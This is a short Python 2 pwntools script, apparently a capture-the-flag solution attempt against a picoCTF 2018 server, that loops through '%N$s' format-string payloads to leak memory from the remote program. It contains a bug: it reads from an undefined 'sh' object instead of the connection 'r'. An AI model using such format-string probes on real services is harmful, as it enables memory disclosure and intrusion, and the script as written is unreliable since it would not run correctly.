from pwn import *

for i in range(100):
  try:
    r = remote('2018shell2.picoctf.com', 46960)
    r.sendlineafter('> ', '%{}$s'.format(i))
    print sh.recvuntil('> ')
    r.close()
  except EOFError:
    pass
